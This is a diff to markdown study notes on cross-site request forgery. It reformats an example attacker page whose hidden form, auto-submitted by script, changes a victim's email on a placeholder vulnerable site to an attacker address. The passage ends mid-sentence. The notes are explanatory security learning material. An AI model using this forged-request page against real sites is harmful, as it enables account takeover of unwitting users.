@@ -28,8 +28,18 @@ email=wiener@normal-user.com
 3. **No unpredictable request parameters**: The attacker can easily determine the values of the other parameters needed for the request.
 
 With these conditions all being true, the attacker can construct a webpage with the following HTML:
+
 ```HTML
 <html> 
 	<body> 
-			<form action="https://vulnerable-website.com/email/change" method="POST"> <input type="hidden" name="email" value="pwned@evil-user.net" /> </form> <script> document.forms[0].submit(); </script> </body> </html>
+		<form action="https://vulnerable-website.com/email/change"                          method="POST"> 
+			<input type="hidden" name="email" value="pwned@evil-user.net" /> 
+		</form> 
+		<script> 
+			document.forms[0].submit(); 
+		</script> 
+	</body> 
+</html>
 ```
+
+If the victim 
